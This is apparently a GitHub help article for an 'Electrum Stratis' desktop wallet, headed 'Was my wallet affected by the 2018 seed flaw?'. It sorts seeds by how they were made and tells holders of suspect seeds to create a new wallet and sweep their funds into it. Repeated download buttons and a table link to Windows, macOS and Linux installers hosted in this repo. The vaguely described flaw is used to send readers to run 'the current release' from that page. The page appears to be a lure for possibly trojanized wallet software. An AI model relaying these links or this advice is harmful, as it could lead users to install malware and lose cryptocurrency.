![Electrum-Stratis](assets/banner-article.png)

# Was my wallet affected by the 2018 seed flaw?

<p align="center">The test is provenance, not a date</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A seed is affected only if it was generated outside the wallet's own backup wizard: a phrase produced by a console command, a script, a website or a third-party generator is the case to treat as suspect. A phrase created offline by the wizard came through the intended path and is not the affected case, and the answer for the suspect case is to move the funds rather than to investigate further. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| How the seed was made | Affected? | What to do |
|---|---|---|
| Backup wizard at wallet creation | No | Keep using it |
| Restored from paper written at creation | No | Keep using it |
| Console command or script | Treat as compromised | New wallet, move funds |
| Online generator or a tool someone sent | Treat as compromised | New wallet, move funds |
| Unknown origin | Treat as compromised | New wallet, move funds |

</div>

The test is provenance, not date. It is also the test that [Electrum Stratis security and keys](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md) applies to every download: what you can verify about where a thing came from decides what you can conclude about it. A wallet installed years ago from a normal creation flow is fine; a wallet created yesterday through a script may not be.

## Why it happens

A seed is only as strong as the randomness behind it. The 2018 flaw sat in a generation route that produced phrases from a weaker source than the wallet's normal flow, which shrinks the space an attacker has to search. The seed still looks ordinary - the right number of words, the right checksum - so nothing on paper reveals it.

That is why provenance is the only reliable test. The wallet's own creation flow draws from the operating system's entropy and, in current builds, verifies the phrase by having you re-enter it in shuffled order. A route outside that flow offers no such assurance, and no inspection of the phrase itself can recover it.

The reporting was thin at the time, and no advisory reached most holders in a form they could find, which is why the question keeps returning. The useful residue is the rule: generate seeds only inside the wallet.

## Fix

1. **Establish provenance honestly.** If you created the wallet through its interface and wrote the phrase down, you are in the clear. If a script, a console command, a website or a person produced it, treat it as exposed.
2. **If the origin is unknown, replace the wallet.** Create a new wallet with a seed generated by the application, write it on paper, verify it by restore, and sweep the balance into it.
3. **Sweep rather than restore the old phrase anywhere.** Restoring reproduces the same keys; the point is to stop using them. A sweep moves the value to addresses the new seed controls.
4. **Check the build's advisory status.** The security posture view shows version, build date, commit hash and advisory status, which places the running application against the record.
5. **Run the current release.** The fix is in the codebase the current build is based on, and an installer predating it is not the thing to run. The current release is available from the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), which is also the only place to check whether a build you already have is the one the record describes.

If the wallet holds nothing yet, the whole procedure is one action: start fresh now, before there is a balance to move.

## If that did not work

If the old wallet cannot be swept because it will not connect, fix the connection first; the sweep is an ordinary transaction once the wallet can see the chain.

If the wallet was created normally but you no longer trust it for a different reason - a machine that was compromised, a phrase photographed - the answer is the same: a new wallet and a sweep. The 2018 flaw is not the only path to exposure, and the response does not depend on identifying which one applied.

If you inherit a wallet from someone else, establish provenance before funding it. That is the one case where the question cannot be answered from your own memory.

## Prevention

- Generate seeds only through the wallet's own creation flow.
- Never use an online generator, a script, or a console command for a phrase.
- Write the phrase on paper at creation and verify it by re-entry.
- Keep the build current and check its advisory status after updates.
- Record the provenance of any wallet you did not create yourself.

## FAQ

### Did the console seed bug affect wallets created normally?

No. The flaw concerned phrases produced through an unsafe generation route; seeds made by the wallet's own creation flow were not that case. If the origin is unknown, replace the wallet rather than reasoning about it.

### How do I know how my seed was generated?

From your own record of creating the wallet. If you used the application's Create flow and wrote the phrase down, that is the normal path. If a script, a website or another person produced it, that is not, and the answer is to move the funds.

### Is it enough to change the password?

No. The password protects the file; the flaw concerns the keys derived from the phrase. A compromised seed stays compromised behind any password, which is why the fix is a new seed and a sweep.

### Can I keep using the wallet if I am unsure?

You can keep using the software - it is maintained and current builds are fixed. What you should not keep is the uncertain seed. Replace the wallet, sweep the balance, and continue with the application.

<!-- DOWNLOAD-BLOCK -->

Answer from the record, not from memory. Which tool created the wallet, on which date, and did it generate the phrase itself or accept one you supplied? Those three facts decide the answer. A seed typed into a later wallet is not repaired by the newer software, and a seed generated after the fix is not endangered by having once been opened in an older one.

## Related articles

- [The 2018 seed flaw: what it was](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/the-2018-seed-flaw.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md)
- [Crypto recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md)
